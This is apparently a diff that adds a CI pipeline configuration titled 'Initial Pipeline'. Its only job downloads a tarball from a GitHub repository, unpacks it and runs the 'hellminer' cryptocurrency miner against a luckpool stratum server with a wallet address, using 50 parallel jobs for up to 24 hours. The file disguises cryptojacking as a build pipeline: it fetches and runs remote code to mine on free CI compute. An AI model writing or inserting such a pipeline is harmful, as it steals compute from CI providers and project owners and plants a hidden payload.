@@ -1,0 +1,17 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 24
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz'
+            - './hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ.coba -p x --cpu 2'
+          parallelism: 50
